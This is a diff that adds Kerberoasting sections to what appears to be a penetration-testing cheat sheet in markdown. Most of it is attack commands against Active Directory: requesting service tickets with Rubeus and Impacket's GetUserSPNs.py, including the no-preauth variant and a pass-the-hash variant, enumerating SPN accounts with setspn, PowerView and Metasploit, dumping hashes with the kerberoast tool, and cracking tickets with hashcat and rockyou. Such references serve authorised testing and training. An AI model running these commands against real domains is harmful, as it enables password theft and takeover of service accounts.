@@ -45,3 +45,42 @@
 | `.\Rubeus.exe kerberoast /user:testspn /nowrap`              | Used to request/download a TGS ticket for a specific user (`/user:testspn`) the formats the output in an easy to view & crack manner (`/nowrap`). Performed from a Windows-based host. |
 | `Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes` | PowerView tool used to check the `msDS-SupportedEncryptionType` attribute associated with a specific user account (`testspn`). Performed from a Windows-based host. |
 | `hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt` | Used to attempt to crack the ticket hash using a wordlist (`rockyou.txt`) from a Linux-based host . |
+
+
+# Kerberoasting without domain account
+
+## Linux
+
+ - GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"
+
+## Windows
+
+ - Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
+
+# Kerberoastable users enumeration
+
+## Windows
+
+ - setspn.exe -Q */* (This is a built-in binary. Focus on user accounts)
+
+ - Get-NetUser -SPN | select serviceprincipalname (Powerview)
+
+ - .\Rubeus.exe kerberoast /stats
+
+## Linux (Metaploit, Impacket, https://github.com/skelsec/kerberoast)
+
+ - msf> use auxiliary/gather/get_user_spns (Metasploit)
+
+ - GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast  (Password will be prompted)
+
+ - GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
+
+ - kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable ( 1. Enumerate kerberoastable users)
+
+ - kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes ( 2. Dump hashes)
+
+
+# Targeted Kerberoasting
+
+## Github repo: https://github.com/ShutdownRepo/targetedKerberoast
+
